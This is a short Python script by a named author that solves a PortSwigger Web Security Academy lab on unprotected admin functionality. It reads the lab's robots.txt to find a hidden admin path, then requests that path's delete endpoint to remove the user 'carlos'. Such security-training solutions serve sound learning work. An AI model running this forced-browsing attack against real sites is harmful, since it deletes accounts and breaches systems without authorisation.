#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: Unprotected admin functionality
#
# Steps: 1. Fetch the /robots.txt file
#        2. Get the admin panel hidden path
#        3. Delete carlos
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a6100fa039be24083078ce8000900fd.web-security-academy.net"

try:  
    # fetch /robots.txt file
    robots = requests.get(f"{url}/robots.txt")
    
except:
    print(Fore.RED + "[!] Failed to fetch /robots.txt through exception")
    exit(1)

print(Fore.WHITE + "1. Fetching /robots.txt file.. " + Fore.GREEN + "OK")

# extract the hidden path
hidden_path = re.findall("Disallow: (.*)", robots.text)[0]

print(Fore.WHITE + "2. Extracting the hidden path.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_path)

try:
    # fetch the admin panel
    # this step is not necessary in the script, you can do step 4 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(f"{url}{hidden_path}")
    
except:
    print(Fore.RED + "[!] Failed to fetch the admin panel through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")

try:  
    # delete carlos
    delete_carlos = requests.get(f"{url}{hidden_path}/delete?username=carlos")
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")    
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    